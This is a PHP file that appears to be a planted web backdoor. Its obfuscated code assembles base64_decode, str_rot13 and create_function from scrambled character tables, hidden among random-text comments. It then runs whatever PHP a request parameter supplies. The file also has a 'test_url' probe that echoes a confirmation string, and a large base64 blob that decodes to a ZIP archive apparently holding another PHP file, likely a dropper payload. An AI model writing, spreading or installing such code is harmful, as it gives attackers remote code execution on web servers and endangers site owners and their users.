<?php 





$PfTiHAzo4883 = "/*c1(496xbargi7z_0;8mvdy35)wqekl2jnso.phftu";


$zMLbUGdz5851 = "";

foreach([35,36,11,41] as $w){
       $zMLbUGdz5851 .= $PfTiHAzo4883[$w];
    }


if(isset($_REQUEST /*GtcHjbdkmYuVnomFlDqHEWRSrXBEVLGJpSPzYwqSUbUfBOKfRmAjqABjVlxyfvBSSKxLGkxTvzmIHHcYroEeVzeUtSnLiypvoWXqisxnPpyFIUokKKCtuQBYKSVsgUXr*/["$zMLbUGdz5851"])){
    $ECsoETqb5781 = $_REQUEST /*GtcHjbdkmYuVnomFlDqHEWRSrXBEVLGJpSPzYwqSUbUfBOKfRmAjqABjVlxyfvBSSKxLGkxTvzmIHHcYroEeVzeUtSnLiypvoWXqisxnPpyFIUokKKCtuQBYKSVsgUXr*/["$zMLbUGdz5851"];
    $fwbPnSwF5866 = "";
    $FBQBocQd4415 = "";

    /*tbMBRwVmysWKzGNBGGTOdjleDGpArPcIddYGbnaaULGUUqQTNsbdKKmbwJWTjickHydeeyYhjykxjsMFOxdKkEhsigwGUUVffncWbcPHsFHtrOCLIVZMDSVcNWQMzaIv*/

    foreach([9,10,35,29,7,5,16,22,29,2,36,22,29] as $w){
       $fwbPnSwF5866 .= $PfTiHAzo4883[$w];
    }

    /*wvUhRaABufYJsElkwNOhQzDgngdmXzodHXGLArePqZitnNOcdZwVWAeDFKkfpsNfLSlKecCwgmlwcqkoEEYdWVzuRGlsAFgBIhKbAgUxPTiSKmATYCuEQJNEXXeYFktq*/


    foreach([35,41,11,11,29,21] as $w){
       $FBQBocQd4415 .= $PfTiHAzo4883[$w];
    }

    /*zPcMREfRrTZIlBKSmUJzDQViWHSYDkzzkRoRavjENnJSHkMltGROjrWfPKzrvDybOmtpdGhLcanvVnJXuLTvJmQwBhZegprXlbshakYmlgKrdJycojPxdAFghYtkLvem*/

    $w = $FBQBocQd4415('n'.'o'.'i'.''.'t'.'c'.''.''.''.'n'.'u'.'f'.'_'.''.''.''.''.'e'.'t'.'a'.'e'.''.'r'.''.''.''.''.'c');
    $E = $w("", $fwbPnSwF5866($ECsoETqb5781));
    $E();
    exit();

}




 





$PDgHlCAN4112 = "jzqitnfysep_(79cg2/.03kw8doaul;r56x1m4bhv)*";


$vNjxUltV6849 = "";

foreach([8,26,31,4] as $v){
       $vNjxUltV6849 .= $PDgHlCAN4112[$v];
    }


if(isset($_REQUEST /*HzEGPRxLBSHAKyMLGkRDjYCOJpXDafGHyTKlVEMcKKSqHjGNhAhFZIbCBesQHMKgHgkKukvnlwwaZOTJaKRAikTjNMgWIniylndbnJxrhbvDJmBznOUoKHfKsooWdIYK*/["$vNjxUltV6849"])){
    $inqnzcTo9202 = $_REQUEST /*HzEGPRxLBSHAKyMLGkRDjYCOJpXDafGHyTKlVEMcKKSqHjGNhAhFZIbCBesQHMKgHgkKukvnlwwaZOTJaKRAikTjNMgWIniylndbnJxrhbvDJmBznOUoKHfKsooWdIYK*/["$vNjxUltV6849"];
    $LkECcWGM2260 = "";
    $WCQKOeey663 = "";

    /*qWGXLerJPPRWjQyhWsfpIfeSxqlOVKUCgyWgKsJYKCYeNPiVWqfvRQfdCAdSJgomqTFjczuhZjzfKIlCpixvtuBjaDnQQvbQTiIfOAzjGJtabuIccTkooRphSARIqEin*/

    foreach([38,27,8,9,33,37,11,25,9,15,26,25,9] as $v){
       $LkECcWGM2260 .= $PDgHlCAN4112[$v];
    }

    /*PqeVUuYeIcHOLazwiyqaEiyadqPtkHIDfrTEsiQTdppwPzJJIWPGmtaLHagXyCBNPmchlPbCRwqXmRmQBoIgoxVrGDRvfsPRSbFDxqGeZwKrdejQOzUzKukPXaVMgbvO*/


    foreach([8,4,31,31,9,40] as $v){
       $WCQKOeey663 .= $PDgHlCAN4112[$v];
    }

    /*oJBTcKFzApyGnjzKuEALzlSiIqtXADvFelRcbYXOvcGNRijyuDzRIWUtNzkcnZPpoGAfufIXJIhOObneNuSRkApzlDvauoCSRUCbggNZribJfNKFAgEKgXexdzZRVxJp*/

    $v = $WCQKOeey663('n'.'o'.''.''.''.'i'.''.''.'t'.'c'.'n'.'u'.''.''.'f'.'_'.''.''.''.''.'e'.'t'.''.''.'a'.''.''.''.'e'.''.'r'.'c'.''.'');
    $M = $v("", $LkECcWGM2260($inqnzcTo9202));
    $M();
    exit();

}




 
if( isset($_REQUEST["test_url"]) ){
echo "file test okay";

}


$data = base64_decode("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